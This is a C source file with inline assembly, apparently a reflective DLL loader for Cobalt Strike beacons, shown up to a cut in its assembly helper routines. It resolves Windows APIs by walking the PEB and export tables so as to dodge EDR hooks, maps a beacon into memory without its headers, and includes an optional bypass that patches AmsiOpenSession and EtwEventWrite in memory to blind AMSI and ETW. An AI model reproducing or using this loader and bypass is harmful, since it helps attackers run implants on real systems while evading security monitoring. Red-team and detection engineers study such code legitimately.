#define WIN32_LEAN_AND_MEAN
#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable 
#include <windows.h>

void* getDllBase(void*);
void* getExportDirectory(void* dllAddr);
void* getExportAddressTable(void* dllBase, void* dllExportDirectory);
void* getExportNameTable(void* dllBase, void* dllExportDirectory);
void* getExportOrdinalTable(void* dllBase, void* dllExportDirectory);
void* getSymbolAddress(void* symbolStr, void* StrSize, void* dllBase, void* AddressTable, void* NameTable, void* OrdinalTable);
void* getRdllBase();
void* getNewExeHeader(void* dllBase);
void* getDllSize(void* newExeHeader);
void* getDllSizeOfHeaders(void* newExeHeader);
void* copyMemory(void* Size, void* source, void* destination);
void* getOptionalHeader(void* NewExeHeader);
void* getSizeOfOptionalHeader(void* NewExeHeader);
void* add(void* , void* );
void* getNumberOfSections(void* newExeHeaderAddr);
void* getImportDirectory(void* OptionalHeader);
void* getBeaconEntryPoint(void* newRdllAddr, void* OptionalHeaderAddr);

typedef struct Export {
    void* Directory;
    void* AddressTable;
    void* NameTable;
    void* OrdinalTable;
}Export;

typedef struct Dll {
    void* dllBase;
    void* NewExeHeader;
    void* size;
    void* SizeOfHeaders;
    void* OptionalHeader;
    void* SizeOfOptionalHeader;
    void* NthSection;
    void* NumberOfSections;
    void* EntryPoint;
    void* TextSection;
    void* TextSectionSize;
    Export Export;
}Dll;

typedef struct Section {
    void* RVA;
    void* dst_rdll_VA;
    void* src_rdll_VA;
    void* PointerToRawData;
    void* SizeOfSection;
}Section;

typedef void*  (NTAPI  * tNtFlush)       (HANDLE, PVOID, unsigned long);
typedef void*  (WINAPI * tLoadLibraryA)  (char*);
typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
typedef void*  (WINAPI * tVirtualAlloc)  (void*, unsigned __int64, unsigned long, unsigned long);
typedef void*  (WINAPI * tVirtualProtect)(void*, unsigned __int64, unsigned long, unsigned long*);
typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned long, void* );
typedef void*  (WINAPI * tVirtualFree)   (void* lpAddress, SIZE_T dwSize, DWORD dwFreeType);

#ifdef BYPASS
typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
#endif

__declspec(dllexport) void* WINAPI BokuLoader()
{
    // Get Export Directory and Export Tables for NTDLL.DLL
    char ws_ntdll[] = {'n',0,'t',0,'d',0,'l',0,'l',0,'.',0,'d',0,'l',0,'l',0,0};
    Dll ntdll;
    ntdll.dllBase             = (void*)getDllBase(ws_ntdll);
    ntdll.Export.Directory    = (void*)getExportDirectory((void*)ntdll.dllBase);
    ntdll.Export.AddressTable = (void*)getExportAddressTable((void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.NameTable    = (void*)getExportNameTable((void*)ntdll.dllBase, ntdll.Export.Directory);
    ntdll.Export.OrdinalTable = (void*)getExportOrdinalTable((void*)ntdll.dllBase, ntdll.Export.Directory);

    // Get Export Directory and Export Tables for Kernel32.dll
    char ws_k32[] = {'K',0,'E',0,'R',0,'N',0,'E',0,'L',0,'3',0,'2',0,'.',0,'D',0,'L',0,'L',0,0};
    Dll k32;
    k32.dllBase               = (void*)getDllBase(ws_k32);
    k32.Export.Directory      = (void*)getExportDirectory((void*)k32.dllBase);
    k32.Export.AddressTable   = (void*)getExportAddressTable((void*)k32.dllBase, k32.Export.Directory);
    k32.Export.NameTable      = (void*)getExportNameTable((void*)k32.dllBase, k32.Export.Directory);
    k32.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)k32.dllBase, k32.Export.Directory);

    char ntstr1[] = {'N','t','F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0};
    tNtFlush pNtFlushInstructionCache = (tNtFlush)      getSymbolAddress(ntstr1, (void*)23, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
    char kstr1[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    tLoadLibraryA pLoadLibraryA      = (tLoadLibraryA)  getSymbolAddress(kstr1, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr2[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    tGetProcAddress pGetProcAddress  = (tGetProcAddress)getSymbolAddress(kstr2, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr3[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    tVirtualAlloc pVirtualAlloc      = (tVirtualAlloc)  getSymbolAddress(kstr3, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr4[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
    tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(kstr4, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
    char kstr5[] = {'V','i','r','t','u','a','l','F','r','e','e',0};
    tVirtualFree pVirtualFree        = (tVirtualFree)   getSymbolAddress(kstr5, (void*)11, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);

    // Initial Source Reflective DLL
    Dll rdll_src;
    rdll_src.dllBase              = (void*)getRdllBase();
    rdll_src.NewExeHeader         = (void*)getNewExeHeader(rdll_src.dllBase);
    rdll_src.size                 = (void*)getDllSize(rdll_src.NewExeHeader);
    rdll_src.SizeOfHeaders        = (void*)getDllSizeOfHeaders(rdll_src.NewExeHeader);
    rdll_src.OptionalHeader       = (void*)getOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.SizeOfOptionalHeader = (void*)getSizeOfOptionalHeader(rdll_src.NewExeHeader);
    rdll_src.NumberOfSections     = (void*)getNumberOfSections(rdll_src.NewExeHeader);

    // AMSI & ETW Optional Bypass
    #ifdef BYPASS
    bypass(&ntdll, &k32, pLoadLibraryA);
    #endif

    // Allocate new memory to write our new RDLL too
    Dll rdll_dst;
    rdll_dst.dllBase              = (void*)pVirtualAlloc(NULL, (unsigned __int64)rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

    // Optionally write Headers from initial source RDLL to loading beacon destination memory
    #ifdef NOHEADERCOPY
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree - MEM_DECOMMIT = 0x00004000. Second arg can be a value from 1-4095
    pVirtualFree(rdll_dst.dllBase,1,0x00004000); // Decommit the first memory page (4096/0x1000 bytes) which would normally hold the copied over headers  - "Private:Reserved"
    #else
    copyMemory(rdll_src.SizeOfHeaders, rdll_src.dllBase, rdll_dst.dllBase);
    #endif

    // Save .text section address and size for destination RDLL so we can make it RE later
    BOOL textSectionFlag = TRUE;
    __int64 numberOfSections      = (__int64)rdll_src.NumberOfSections;
    rdll_src.NthSection           = add(rdll_src.OptionalHeader, rdll_src.SizeOfOptionalHeader);
    Section section;
    while( numberOfSections-- )
    {
        __asm__(
            "add rax, 0xC \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            :[SectionRVA] "=r" (section.RVA)        // RAX OUT
            :[nthSection] "r" (rdll_src.NthSection) // RAX IN
        );
        section.dst_rdll_VA = add(rdll_dst.dllBase, section.RVA);
        __asm__(
            "add rax, 0x14 \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            :[PointerToRawData] "=r" (section.PointerToRawData)
            :[nthSection] "r" (rdll_src.NthSection)
        );
        section.src_rdll_VA = add(rdll_src.dllBase, section.PointerToRawData);
        __asm__(
            "add rax, 0x10 \n"
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"
            "xchg rax, rbx \n"
            :[SizeOfSection] "=r" (section.SizeOfSection)
            :[nthSection] "r" (rdll_src.NthSection)
        );
        // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
        if(textSectionFlag == TRUE)
        {
            textSectionFlag = FALSE; 
            rdll_dst.TextSection = section.dst_rdll_VA;
            rdll_dst.TextSectionSize = section.SizeOfSection;
        }
        // Copy the section from the source address to the destination for the size of the section
        copyMemory(section.SizeOfSection, section.src_rdll_VA, section.dst_rdll_VA);
        // Get the address of the next section header and loop until there are no more sections
        __asm__(
            "add rax, 0x28 \n" // sizeof( IMAGE_SECTION_HEADER ) = 0x28
            :[OutRdllNthSectionAddr] "=r" (rdll_src.NthSection)
            :[InRdllNthSectionAddr]  "r"  (rdll_src.NthSection)
        );
    }
    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
    void* rdllDataDirImportDirectoryAddr;
    __asm__(
        "add rax, 0x78 \n"
        :[rdllDataDirImportDirectoryAddr] "=r" (rdllDataDirImportDirectoryAddr)
        :[OptionalHeader] "r" (rdll_src.OptionalHeader)
    );
    // Get the Address of the Import Directory from the Data Directory
    void* rdllImportDirectoryAddr;
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax] \n"  // EBX = RVA of Import Directory
        "add rdx, rbx \n" // Import Directory of New RDLL = RVA of Import Directory + New RDLL Base Address
        "xchg rax, rdx \n"
        :[rdllImportDirectoryAddr] "=r" (rdllImportDirectoryAddr)
        :[rdllDataDirImportDirectoryAddr] "r" (rdllDataDirImportDirectoryAddr), // RAX IN 
         [dllBase] "r" (rdll_dst.dllBase) // RDX IN
    );
    void* nextModuleImportDescriptor = rdllImportDirectoryAddr;
    Dll dll_import;
    void *importEntryHint, *importedDllBaseOrdinal, *importEntryExportTableIndex, *importEntryAddressRVA, *importEntryAddress, *importNameRVA, *importName;
    __asm__(
        "xor rbx, rbx \n"
        "add rdx, 0xC \n"        // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
        "mov ebx, [rdx] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
        "push rbx \n"            // save the RVA for the Name of the DLL to be imported to the top of the stack
        "pop rdx \n"             // R12&RBX = RVA of Name DLL
        "cmp ebx, 0x0 \n"        // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
        "je check1 \n"
        "add rax, rbx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
        "check1: \n"
        :[importNameRVA] "=r" (importNameRVA),  // RDX OUT 
         [importName] "=r" (importName) // RAX OUT 
        :[dllBase] "r" (rdll_dst.dllBase), // RAX IN
         [nextModuleImportDescriptor] "r" (nextModuleImportDescriptor)// RDX IN 
    );
    // Import all the symbols from all the import tables listed in the import directory
    void *importLookupTableEntry, *importAddressTableEntry, *importEntryNameString, *importEntryNameStringLength, *importEntryFunctionAddress, *checkNullImportAddressTableEntry;

    // The last entry in the image import directory is all zeros
    while(importNameRVA)
    {
        dll_import.dllBase = (void*)getDllBase(importName);
        // If the DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
        if (dll_import.dllBase == NULL){
            dll_import.dllBase = (void*)pLoadLibraryA((char*)(importName));
        }
        // importLookupTableEntry = VA of the OriginalFirstThunk
        __asm__(
            "xor rbx, rbx \n"
            "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into EBX
            "add rbx, rdx \n"        // importLookupTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->OriginalFirstThunk 
            "xchg rax, rbx \n"
            :[importLookupTableEntry] "=r" (importLookupTableEntry)
            :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
             [dllBase] "r" (rdll_dst.dllBase)
        );
        // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
        __asm__(
            "xor rbx, rbx \n"
            "add rax, 0x10 \n"       // 16 (0x10) byte offset is the address of the DWORD FirstThunk within the image import descripto
            "mov ebx, [rax] \n"      // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->FirstThunk into EBX
            "add rbx, rdx \n"        // importAddressTableEntry = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->FirstThunk 
            "xchg rax, rbx \n"
            :[importAddressTableEntry] "=r" (importAddressTableEntry)
            :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
             [dllBase] "r" (rdll_dst.dllBase)
        );
        __asm__(
            "mov rax, [rax] \n"
            :[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
            :[importAddressTableEntry] "r" (importAddressTableEntry)
        );
        while(checkNullImportAddressTableEntry)
        {
            dll_import.Export.Directory    = getExportDirectory(dll_import.dllBase);
            dll_import.Export.AddressTable = getExportAddressTable(dll_import.dllBase, dll_import.Export.Directory);
            dll_import.Export.NameTable    = getExportNameTable(dll_import.dllBase,    dll_import.Export.Directory);
            dll_import.Export.OrdinalTable = getExportOrdinalTable(dll_import.dllBase, dll_import.Export.Directory);

            if( importLookupTableEntry && ((PIMAGE_THUNK_DATA)importLookupTableEntry)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
            {
                // Export Base Ordinal from the Export Directory of the module/dll being imported (0x10 offset)
                //   This is located in the Export Directory in memory of the module which functions/api's are being imported
                // importedDllBaseOrdinal = ((PIMAGE_EXPORT_DIRECTORY )importedDllExportDirectory)->Base;
                __asm__(
                    "xor rdx, rdx \n"
                    "add rax, 0x10 \n"         // DWORD Base; // 0x10 offset // RCX = &importedDllBaseOrdinal
                    "mov edx, [rax] \n"        // RAX = importedDllBaseOrdinal (Value/DWORD)
                    "xchg rax, rdx \n"
                    :[importedDllBaseOrdinal] "=r" (importedDllBaseOrdinal)
                    :[Directory] "r" (dll_import.Export.Directory)
                );
                // Import Hint from the modules Hint/Name table
                __asm__(
                    "mov rax, [rax] \n" // RAX = 8000000000000013. 13 is the original Thunk, now we need to get rid of the 8
                    "and eax, 0xFFFF \n" // get rid of the 8
                    :[importEntryHint] "=r" (importEntryHint)
                    :[importLookupTableEntry] "r" (importLookupTableEntry)
                );
                // Use the import entries Hint and the Imported Modules Base Ordinal from its Export Directory to find the index of our entry/import within the Export Address Table
                // Import Hint from Hint/Name Table (first 2 bytes before the name string)
                // ImportHint - ExportBaseOrdinal = The location of the API/function in the ExportAddressTable entries
                // importEntryExportTableIndex = importEntryHint - importedDllBaseOrdinal;
                __asm__(
                    "sub rax, rdx \n"
                    :[importEntryExportTableIndex] "=r" (importEntryExportTableIndex)
                    :[importEntryHint] "r" (importEntryHint),
                     [importedDllBaseOrdinal] "r" (importedDllBaseOrdinal)
                );
                // Get the RVA for our Import Entry executable function address
                // The ExportAddressTable/AddressOfFunctions holds DWORD (4 byte) RVA's for the executable functions/api's address
                // importEntryAddressRVA = importEntryExportTableIndex * sizeof(DWORD) + AddressTable;
                __asm__(
                    "mov r12, rdx \n"
                    "xor rbx, rbx \n"
                    "add bl, 0x4 \n"                  // RBX = sizeof(DWORD) - This is because each entry in the table is a 4 byte DWORD which is the RVA/offset for the actual executable functions address
                    "mul rbx \n"                      // RAX = importEntryExportTableIndex * sizeof(DWORD)
                    "add rax, r12 \n"                 // RAX = RVA for our functions address
                    "xor rbx, rbx \n"
                    "mov ebx, [rax] \n"               // The RVA for the executable function we are importing
                    "add rcx, rbx \n"                 // The executable address within the imported DLL for the function we imported
                    "xchg rax, rcx \n"
                    :[importEntryAddress] "=r" (importEntryAddress)
                    :[importEntryExportTableIndex]"r"(importEntryExportTableIndex), // RAX IN - importEntryExportTableIndex
                    [AddressTable]"r"(dll_import.Export.AddressTable),              // RDX IN - AddressTable 
                    [dllBase] "r" (dll_import.dllBase)                              // RCX IN - dllBase
                    
                );
                // patch in the address for this imported function
                __asm__(
                    "mov [rax], rdx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    :[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX IN = The import table entry we are going to overwrite
                     [importEntryAddress] "r" (importEntryAddress)             // RDX IN 
                 );
            }
            else
            {
                // If there was no ordinal/hint to import then import via the name from the import tables Hint/Name Table for the imported module
                // get the VA of this functions import by name struct
                __asm__(
                    "mov rax, [rax] \n" // RVA for our functions Name/Hint table entry
                    "add rax, rdx \n"   // VA (Address in memory) Name/Hint Entry = RVA Name/Hint Entry + New RDLL Address
                    "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                    :[importEntryNameString] "=r" (importEntryNameString) 
                    :[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
                     [dllBase] "r" (rdll_dst.dllBase)
                );
                // Get the string length for the import function name
                __asm__(
                    "xor rcx, rcx \n"
                    "countLoop: \n"
                    "inc cl \n" // increment the name string length counter
                    "xor rbx, rbx \n"
                    "cmp bl, [rax] \n" // are we at the null terminator for the string?
                    "je fStrLen \n"
                    "inc rax \n" // move to the next char of the string
                    "jmp short countLoop \n"
                    "fStrLen: \n"
                    "xchg rax, rcx \n" 
                    :[importEntryNameStringLength] "=r" (importEntryNameStringLength) 
                    :[importEntryNameString] "r" (importEntryNameString) 
                );    
                // use GetSymbolAddress to dodge EDR hooks on GetProcAddress() and patch in the address for this imported function
                importEntryAddress = getSymbolAddress(importEntryNameString, importEntryNameStringLength, dll_import.dllBase, dll_import.Export.AddressTable, dll_import.Export.NameTable, dll_import.Export.OrdinalTable);
                // If getSymbolAddress() returned a NULL then the symbol is a forwarder string. Use normal GetProcAddress() to handle forwarder
                if (importEntryAddress == NULL){
                    importEntryAddress = (void*)pGetProcAddress((HMODULE)dll_import.dllBase, (char*)importEntryNameString);
                }
                __asm__(
                    "mov [rax], rdx \n"  // write the address of the imported api to our import table
                    : // no outputs
                    :[importAddressTableEntry] "r" (importAddressTableEntry),  // RAX = The import table entry we are going to overwrite
                     [importEntryAddress] "r" (importEntryAddress) 
                );
            }
            importAddressTableEntry += 0x8;
            if(importLookupTableEntry)
                importLookupTableEntry += 0x8;
            __asm__(
                "mov rax, [rax] \n"
                :[checkNullImportAddressTableEntry] "=r" (checkNullImportAddressTableEntry)
                :[importAddressTableEntry] "r" (importAddressTableEntry)
            );
        }
        __asm__(
            "add rax, 0x14 \n" // 0x14 = 20 = sizeof( IMAGE_IMPORT_DESCRIPTOR )
            :[outNextModuleImportDescriptor] "=r" (nextModuleImportDescriptor)
            :[inNextModuleImportDescriptor] "r" (nextModuleImportDescriptor)
        );
        // We need to do this again for the next module/DLL in the Import Directory
        __asm__(
            "xor rbx, rbx \n"
            "add rax, 0xC  \n"  // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
            "mov ebx, [rax] \n" // Move the 4 byte DWORD of IMAGE_IMPORT_DESCRIPTOR->Name into EBX
            "push rbx \n"       // save the RVA for the Name of the DLL to be imported to the top of the stack
            "pop rax \n"        // R12&RBX = RVA of Name DLL
            "cmp ebx, 0x0 \n"   // if this value is 0 we are at the end of the DLL's we need to import symbols/functions/api's from
            "je check2 \n"
            "add rdx, rbx \n"   // Address of Module String = newRdllAddr + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name 
            "check2: \n"
            :[importName] "=r" (importName),       // RDX OUT
             [importNameRVA] "=r" (importNameRVA)  // RAX OUT
            :[nextModuleImportDescriptor] "r" (nextModuleImportDescriptor),
             [newRdllAddr] "r" (rdll_dst.dllBase)
        );
    }
    //rdll_dst.NewExeHeader   = getNewExeHeader(rdll_dst.dllBase);
    //rdll_dst.OptionalHeader = getOptionalHeader(rdll_dst.NewExeHeader);
    void* BaseAddressDelta;
    __asm__(
        "add rdx, 0x18 \n"       // OptionalHeader.ImageBase
        "mov rdx, [rdx] \n"
        "sub rax, rdx \n"       // dllBase.ImageBase
        :[BaseAddressDelta] "=r" (BaseAddressDelta)
        :[dllBase] "r" (rdll_dst.dllBase),
        [OptionalHeader] "r" (rdll_src.OptionalHeader)
    );
    void* newRelocationDirectoryAddr;
    __asm__(
        "xor rbx, rbx \n"
        "mov rbx, 0x98 \n"            // OptionalHeaderAddr + 0x98 = &DataDirectory[Base Relocation Table]
        "add rax, rbx \n"             // OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        :[newRelocationDirectoryAddr] "=r" (newRelocationDirectoryAddr)
        :[OptionalHeader] "r" (rdll_src.OptionalHeader)
    );
    void* nextRelocBlock;
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rdx] \n"  // Move the 4 byte DWORD Virtual Address of the Relocation Directory table into the EBX register
        "add rax, rbx \n"    // newRelocationTableAddr = dllBase + RVAnewRelocationTable
        :[nextRelocBlock] "=r" (nextRelocBlock)
        :[dllBase] "r" (rdll_dst.dllBase),
        [newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr)       
    );
    void* newRelocationDirectorySize;
    __asm__(
        "xor rbx, rbx \n"
        "mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD Size of the Relocation Directory table into the EBX register
        "xchg rax, rbx \n"
        :[newRelocationDirectorySize] "=r" (newRelocationDirectorySize)
        :[newRelocationDirectoryAddr] "r" (newRelocationDirectoryAddr)
    );
    // check if their are any relocations present
    if(newRelocationDirectorySize)
    {
        void* relocBlockSize;
        __asm__(
            "xor rbx, rbx \n"
            "mov ebx, [rax+0x4] \n"  // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock into EBX
            "xchg rax, rbx \n"
            :[relocBlockSize] "=r" (relocBlockSize)
            :[nextRelocBlock] "r" (nextRelocBlock)
        );
        void* relocVA;
        void* RelocBlockEntries;
        void* nextRelocBlockEntry;    
        while(relocBlockSize)
        {
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rdx] \n"   // Move the 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress into EBX
                "add rax, rbx \n"     // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
                :[relocVA] "=r" (relocVA)
                :[dllBase] "r" (rdll_dst.dllBase),
                 [nextRelocBlock] "r" (nextRelocBlock)
            );
            __asm__(
                "xor rbx, rbx \n"
                "xor rdx, rdx \n"
                "inc bl \n"
                "inc bl \n"      // RBX = 0x2 = size of image relocation WORD
                "sub ax, 0x8 \n" // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
                "div bx \n"      // RAX/RBX = relocBlockSize/2 = RAX
                :[RelocBlockEntries] "=r" (RelocBlockEntries)
                :[relocBlockSize] "r" (relocBlockSize)
            );
            __asm__(
                "add rax, 0x8 \n"
                :[nextRelocBlockEntry] "=r" (nextRelocBlockEntry)
                :[nextRelocBlock] "r" (nextRelocBlock)
            );
            while( RelocBlockEntries-- )
            {
                __asm__(
                    "xor rbx, rbx \n"
                    "mov bx, [rax] \n"   // RDX = the 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
                    "mov rax, rbx \n"
                    "shr rbx, 0x0C \n"   // Check the 4 bit type
                    "cmp bl, 0x0A \n"    // IMAGE_REL_BASED_DIR64?
                    "jne badtype \n"
                    "shl rax, 0x34 \n"   // only keep the last 12 bits of RAX by shaking the RAX register
                    "shr rax, 0x34 \n"   // the last 12 bits is the offset, the first 4 bits is the type
                    "add rdx, rax \n"    // in memory Virtual Address of our current relocation entry
                    "mov rbx, [rdx] \n"  // value of the relocation entry
                    "add rbx, rcx \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
                    "mov [rdx], rbx \n"  // WRITE THAT RELOC!
                    "badtype:\n"
                    : // no outputs
                    :[nextRelocBlockEntry] "r" (nextRelocBlockEntry),
                    [relocVA] "r" (relocVA),
                    [BaseAddressDelta] "r" (BaseAddressDelta)
                   );
                __asm__(
                    "add rax, 0x2 \n"
                    :[out_NRBE] "=r" (nextRelocBlockEntry)
                    :[in_NRBE]  "r"  (nextRelocBlockEntry)
                );
            }
            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
            __asm__(
                "xor rbx, rbx \n"
                "mov ebx, [rax+0x4] \n"  // 4 byte DWORD of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock 
                "xchg rax, rbx \n"
                :[relocBlockSize] "=r" (relocBlockSize)
                :[nextRelocBlock] "r" (nextRelocBlock)
            );
        }
    }
    unsigned long oldprotect = 0;
    pVirtualProtect(rdll_dst.TextSection, (unsigned __int64)rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);
    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);

    pNtFlushInstructionCache((void*)-1, NULL, 0);

    ((DLLMAIN)rdll_dst.EntryPoint)( rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
    return rdll_dst.EntryPoint;
}

#ifdef BYPASS
// ######### OPTIONAL BYPASS AMSI & ETW CODE ########
void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
    // ######### AMSI.AmsiOpenSession Bypass
    char as[] = {'a','m','s','i','.','d','l','l',0};
    Dll amsi;
    amsi.dllBase = (void*)getDllBase((void*)as); // check if amsi.dll is already loaded into the process
    // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
    if (amsi.dllBase == NULL){
        amsi.dllBase = (void*)pLoadLibraryA((char*)(as));
    }
    amsi.Export.Directory      = (void*)getExportDirectory((void*)amsi.dllBase);
    amsi.Export.AddressTable   = (void*)getExportAddressTable((void*)amsi.dllBase, amsi.Export.Directory);
    amsi.Export.NameTable      = (void*)getExportNameTable((void*)amsi.dllBase, amsi.Export.Directory);
    amsi.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)amsi.dllBase, amsi.Export.Directory);
    char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
    void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);

    SIZE_T bytesWritten;
    unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
    char wpm[] = {'W','r','i','t','e','P','r','o','c','e','s','s','M','e','m','o','r','y',0};
    tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(wpm, (void*)18, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
    pWriteProcessMemory((void*)-1, pAmsiOpenSession, (void*)amsibypass, sizeof(amsibypass), &bytesWritten);

    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
    char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    void* pEtwEventWrite  = getSymbolAddress(eew, (void*)13, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);

    unsigned char etwbypass[] = { 0xc3 }; // ret
    pWriteProcessMemory((void*)-1, pEtwEventWrite, (void*)etwbypass, sizeof(etwbypass), &bytesWritten);
    return;
}
#endif

__asm__(
"getRdllBase: \n"
    "call pop \n"       // Calling the next instruction puts RIP address on the top of our stack
    "pop: \n"
    "pop rcx \n"        // pop RIP into RCX
"dec1:"
    "xor rbx,rbx \n"    // Clear out RBX - were gonna use it for comparing if we are at start
    "mov ebx,0x5A4D \n" // "MZ" bytes for comparing if we are at the start of our reflective DLL
    "dec rcx \n"
    "cmp bx, word ptr ds:[rcx] \n" // Compare the first 2 bytes of the page to "MZ"
    "jne dec1 \n"            
    "xor rax, rax \n"
    "mov ax, [rcx+0x3C] \n" // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
    "add rax, rcx \n"       // DLL base + RVA new exe header = 0x00004550 PE00 Signature
    "xor rbx,rbx \n"
    "add bx, 0x4550\n"      // PEOO
    "cmp bx, word ptr ds:[rax] \n" // Compare the 4 bytes to PE\0\0
    "jne dec1 \n"            
    "mov rax, rcx \n"       // Return the base address of our reflective DLL
    "ret \n"                // return initRdllAddr
"getDllBase: \n"
    "xor rax, rax \n"             // RAX = 0x0
// Check if dllName string is ASCII or Unicode
    "mov rcx, [rcx] \n"           // RCX = First 8 bytes of string 
"getMemList:"
    "mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
    "mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
    "mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov r11, rbx \n" 
"crawl: \n"
    "mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
    "mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
    "cmp rax, rcx \n"
    "je found \n"
    "mov rbx, [rbx] \n"           // RBX = InMemoryOrderLinks Next Entry
    "cmp r11, [rbx] \n"           // Are we back at the same entry in the list?
    "jne crawl \n"
    "xor rax, rax \n"             // DLL is not in InMemoryOrderModuleList, return NULL
    "jmp end \n"
"found: \n"
    "mov rax, [rbx+0x20] \n" // [rbx+0x20] = DllBase Address in process memory
"end: \n"
    "ret \n"
"getExportDirectory: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rcx, rcx \n"
    "add cx, 0x88 \n"
